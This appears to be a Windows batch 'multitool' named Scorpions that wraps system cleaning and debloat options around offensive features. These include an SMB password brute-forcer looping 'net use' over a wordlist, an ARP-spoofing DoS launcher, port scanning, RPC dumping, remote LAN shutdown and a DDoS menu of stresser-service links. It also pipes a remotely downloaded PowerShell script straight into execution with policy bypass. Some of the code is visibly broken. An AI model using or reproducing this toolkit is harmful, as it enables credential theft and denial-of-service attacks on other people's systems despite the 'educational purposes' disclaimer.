@echo off
chcp 65001>nul
color 0a

:menu
title Scorpions
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────				    			                                                                                                                                                                                                                        																					                   
type ascii.txt              																			                       																					                      																					         
echo.									 
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4"') do (
    set IP=%%i
)
set IP=%IP:~1%
echo IP adress : %IP%
ping 8.8.8.8>nul
if errorlevel 1 (
echo Wifi state : Not Connected
) else echo Wifi state : Connected

echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Hello %username%
echo.
echo 			[1] : Credits
echo 			[2] : Github
echo 			[3] : Change color
echo 			[4] : Access tool
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
set /p menu= Choose a option :
if %menu%==1 goto credits
if %menu%==2 goto github
if %menu%==3 goto color
if %menu%==4 goto tool

:credits
title Scorpions - Credits
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Project made by Polonium
echo Start coding 11/09/2025
echo v.1.0 patchnotes : Created the tool
echo v.1.1 patchnotes : Improved the GUI of the tool and added user's informations, removed some useless tools and added 
echo others
echo Thanks to the patorjk.com website for the ascii caracters
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Project made for educationnal purposes only !
echo I am not responsible for anything that happens due to your use, modification or illegal use of this code.
echo Do not use it for military use or non-ethical hacking
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pause
goto menu 


:github
start https://github.com/Polonium32
goto menu 
:color
title Scorpions - Color
cls 
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo	Choose the color : 
echo.
echo 			[1] : Default
echo 			[2] : Blue
echo 			[3] : Red
echo 			[4] : White
echo 			[5] : Pink
echo 			[6] : Cyan
echo 			[7] : Gray
echo 			[8] : Yellow
echo 			[9] : Purple
echo 			[10] : Navy
echo.
echo 			[menu] : go to menu
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
set /p menu= Choose the color :
if %menu%==1 color 0a
if %menu%==2 color 9
if %menu%==3 color 4
if %menu%==4 color 7
if %menu%==5 color C
if %menu%==6 color B
if %menu%==7 color 8
if %menu%==8 color 6
if %menu%==9 color 5
if %menu%==10 color 1
if %menu%==menu goto menu
goto color

:tool
title Tool
cls 
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo 	Choose the option :
echo.
echo 			[1] : Windows Debloat
echo 			[2] : User info
echo 			[3] : PC Cleaner
echo 			[4] : Remotely shutdown a PC on LAN  
echo 			[5] : SMB Bruteforcer
echo 			[6] : Create an admin account
echo 			[7] : IP Geolocation
echo 			[8] : Launch Kali linux, Must have Kali Linux installed
echo.
echo 			[menu] : go to menu 
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo.
set /p menu= Choose a option :
if %menu%==1 goto debloat
if %menu%==2 goto info
if %menu%==3 goto cleaner
if %menu%==4 goto shutdown
if %menu%==5 goto bruteforcer
if %menu%==6 goto admin 
if %menu%==7 goto ip
if %menu%==8 goto linux
if %menu%==menu goto menu 

:debloat
title Multitool - Windows Debloat
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
type debloatascii.txt
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
REM Vérifier si l'utilisateur est admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo You need to be admin to launch this programm
    pause
    goto tool
)

REM Appel PowerShell qui telecharge et execute WinUtil
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb https://christitus.com/win | iex"
pause 
goto tool

:info
cls
title Multitool - User info
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
type infoascii.txt
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
net user
set /p usr= Please enter the username you want info about: 
cls 
net user %usr%
pause
goto tool

:cleaner
title Multitool - Cleaner
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
type cleanerascii.txt 
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Select a tool
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo [1] Delete Internet Cookies
echo [2] Delete Temporary Internet Files
echo [3] Disk Cleanup
echo [4] Disk Defragment
echo [5] Exit
echo.
set /p op=Run:
if %op%==1 goto 1
if %op%==2 goto 2
if %op%==3 goto 3
if %op%==4 goto 4
if %op%==5 goto tool

goto error

:1
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Delete Internet Cookies
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Deleting Cookies...
ping localhost -n 3 >nul
del /f /q "%userprofile%\Cookies\*.*"
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Delete Internet Cookies
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Cookies deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto cleaner

:2
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Delete Temporary Internet Files
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Deleting Temporary Files...
ping localhost -n 3 >nul
del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Delete Temporary Internet Files
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Temporary Internet Files deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto cleaner

:3
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Disk Cleanup
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Running Disk Cleanup...
ping localhost -n 3 >nul
if exist "C:\WINDOWS\temp"del /f /q "C:WINDOWS\temp\*.*"
if exist "C:\WINDOWS\tmp" del /f /q "C:\WINDOWS\tmp\*.*"
if exist "C:\tmp" del /f /q "C:\tmp\*.*"
if exist "C:\temp" del /f /q "C:\temp\*.*"
if exist "%temp%" del /f /q "%temp%\*.*"
if exist "%tmp%" del /f /q "%tmp%\*.*"
if not exist "C:\WINDOWS\Users\*.*" goto skip
if exist "C:\WINDOWS\Users\*.zip" del "C:\WINDOWS\Users\*.zip" /f /q
if exist "C:\WINDOWS\Users\*.exe" del "C:\WINDOWS\Users\*.exe" /f /q
if exist "C:\WINDOWS\Users\*.gif" del "C:\WINDOWS\Users\*.gif" /f /q
if exist "C:\WINDOWS\Users\*.jpg" del "C:\WINDOWS\Users\*.jpg" /f /q
if exist "C:\WINDOWS\Users\*.png" del "C:\WINDOWS\Users\*.png" /f /q
if exist "C:\WINDOWS\Users\*.bmp" del "C:\WINDOWS\Users\*.bmp" /f /q
if exist "C:\WINDOWS\Users\*.avi" del "C:\WINDOWS\Users\*.avi" /f /q
if exist "C:\WINDOWS\Users\*.mpg" del "C:\WINDOWS\Users\*.mpg" /f /q
if exist "C:\WINDOWS\Users\*.mpeg" del "C:\WINDOWS\Users\*.mpeg" /f /q
if exist "C:\WINDOWS\Users\*.ra" del "C:\WINDOWS\Users\*.ra" /f /q
if exist "C:\WINDOWS\Users\*.ram" del "C:\WINDOWS\Users\*.ram"/f /q
if exist "C:\WINDOWS\Users\*.mp3" del "C:\WINDOWS\Users\*.mp3" /f /q
if exist "C:\WINDOWS\Users\*.mov" del "C:\WINDOWS\Users\*.mov" /f /q
if exist "C:\WINDOWS\Users\*.qt" del "C:\WINDOWS\Users\*.qt" /f /q
if exist "C:\WINDOWS\Users\*.asf" del "C:\WINDOWS\Users\*.asf" /f /q

:skip
if not exist C:\WINDOWS\Users\Users\*.* goto skippy /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.zip del C:\WINDOWS\Users\Users\*.zip /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.exe del C:\WINDOWS\Users\Users\*.exe /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.gif del C:\WINDOWS\Users\Users\*.gif /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.jpg del C:\WINDOWS\Users\Users\*.jpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.png del C:\WINDOWS\Users\Users\*.png /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.bmp del C:\WINDOWS\Users\Users\*.bmp /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.avi del C:\WINDOWS\Users\Users\*.avi /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpg del C:\WINDOWS\Users\Users\*.mpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpeg del C:\WINDOWS\Users\Users\*.mpeg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ra del C:\WINDOWS\Users\Users\*.ra /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ram del C:\WINDOWS\Users\Users\*.ram /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mp3 del C:\WINDOWS\Users\Users\*.mp3 /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.asf del C:\WINDOWS\Users\Users\*.asf /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.qt del C:\WINDOWS\Users\Users\*.qt /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mov del C:\WINDOWS\Users\Users\*.mov /f /q

:skippy
if exist "C:\WINDOWS\ff*.tmp" del C:\WINDOWS\ff*.tmp /f /q
if exist C:\WINDOWS\ShellIconCache del /f /q "C:\WINDOWS\ShellI~1\*.*"
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Disk Cleanup
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Disk Cleanup successful!
echo.
pause
goto cleaner

:4
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Disk Defragment
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Defragmenting hard disks...
ping localhost -n 3 >nul
defrag -c -v
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo Disk Defragment
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo Disk Defrag successful!
echo.
pause
goto cleaner

:error
cls
echo Command not recognized.
ping localhost -n 4 >nul
pause 
goto cleaner

:shutdown
cls
title Multitool - Shutdown
echo Click "Browse" to select computers to shut down.
shutdown -i
goto tool

:bruteforcer
cls
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
type bruteforcerascii.txt
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
set /p ip="Enter IP Adress: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=0
for /f %%a in (%wordlist%) do (
	set pass=%%adress
	call :attempt
)
echo Password not Found :(
pause 
goto tool

:success
echo.
echo Password Found ! : %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto tool

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo ATTEMPT: %pass%
if %errorlevel% EQU 0 goto success

:admin 
cls
title Multitool - Admin 
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
type adminascii.txt
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
start notepad "copypast.txt"
echo.
echo 		Write out these 2 commands from the txt file in the cmd window that just appeared 
echo  		Remember to replace the [name] and [password] with what you want 


pause 
goto tool



:linux
cls
echo opening kali...
cls
kali
goto tool

:ip 
cls
all powershell exit >nul
color A
cd files

:menu1
set ip=""
cls
echo.
type ipascii.txt
echo.
echo.
echo       												PUBLIC IP
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo     					[1] : Geolocate
echo     					[2] : Trace DNS
echo     					[3] : Port Scan
echo    					[4] : DDOS
echo.
echo       												LOCAL IP
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
echo.
echo     					[5] : Trace Mac Address
echo    					[6] : Port Scan
echo    					[7] : ARP Spoof (DOS)
echo     					[8] : RPC Dump
echo.
echo ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
set /p input=Choose a option : 
if /I "%input%" EQU "1" goto geolocate
if /I "%input%" EQU "2" goto tracedns
if /I "%input%" EQU "3" goto portscan
if /I "%input%" EQU "4" goto ddos
if /I "%input%" EQU "5" goto Macaddr
if /I "%input%" EQU "6" goto portscan
if /I "%input%" EQU "7" goto arpspoof
if /I "%input%" EQU "8" goto rpcdump

:rpcdump
cls
echo.
set /p ip=Enter IP Address: 
rpcdump %ip%
echo.
pause
cls
goto menu1

:Macaddr
cls
echo.
set /p ip=Enter IP Address: 
ping -w 1 %ip% >nul
for /f "tokens=2 delims= " %%a in ('arp -a ^| find "%ip%"') do set macaddr=%%a
for /f "usebackq delims=" %%I in (`powershell "\"%macaddr%\".toUpper()"`) do set "upper=%%~I"
cls
echo.
echo Mac Address: %upper%
echo.
pause
cls
goto menu1

:arpspoof
cls
echo.
set errorlevel=0
set /p ip=Enter IP Address: 
start cmd /c "mode 87, 10 && title Spoofing %ip%... && echo. && arpspoof.exe %ip%"
goto menu1

:ddos
cls
echo.
echo 1) https://freestresser.so/
echo 2) https://hardstresser.com/
echo 3) https://stresser.net/
echo 4) https://str3ssed.co/
echo 5) https://projectdeltastress.com/
echo 6) Back
echo.
set /p ddosinput=
if /I "%ddosinput%" EQU "1" start https://freestresser.so/
if /I "%ddosinput%" EQU "2" start https://hardstresser.com/
if /I "%ddosinput%" EQU "3" start https://stresser.net/
if /I "%ddosinput%" EQU "4" start https://str3ssed.co/
if /I "%ddosinput%" EQU "5" start https://projectdeltastress.com/
if /I "%ddosinput%" EQU "6" goto menu
goto menu1

:portscan
cls
set errorlevel=0
echo.
set /p ip=IP Address: 
set /p ports=Ports (e.g. 21,22,23): 
start cmd /c "mode 40, 15 && title Scanning Ports... && PortScanner.exe hosts=%ip% ports=%ports%>>portscan.txt"
ping localhost -n 5 >nul
taskkill /im PortScanner.exe /f >nul 2>&1
echo.
type portscan.txt
echo.
ping localhost -n 1 >nul
del portscan.txt
pause
goto menu1

:tracedns
cls
echo.
set /p ip=IP Address: 
cls
for /f "tokens=2 delims= " %%a in ('nslookup %ip% ^| find "Name"') do set dns=%%a
echo.
echo Domain Name: %dns%
echo.
pause
goto menu1

:geolocate
cls
echo.
set /p ip=IP Address: 
cls
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
if exist "%temp%\%webclient%.vbs" del "%temp%\%webclient%.vbs" /f /q /s >nul
if exist "%temp%\response.txt" del "%temp%\response.txt" /f /q /s >nul

:iplookup
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs

:localip
cls
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
pause
goto menu1
:response_exist
cls
echo.
for /f "delims=     " %%i in ('findstr /i "," %temp%\response.txt') do (
    set data=%%i
    set data=!data:,=!
    set data=!data:""=Not Listed!
    set data=!data:"=!
    set data=!data:ip:=IP:      !
    set data=!data:hostname:=Hostname:  !
    set data=!data:org:=ISP:        !
    set data=!data:city:=City:      !
    set data=!data:region:=State:   !
    set data=!data:country:=Country:    !
    set data=!data:postal:=Postal:  !
    set data=!data:loc:=Location:   !
    set data=!data:timezone:=Timezone:  !
    echo !data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
if '%ip%'=='' goto menu
pause
goto tool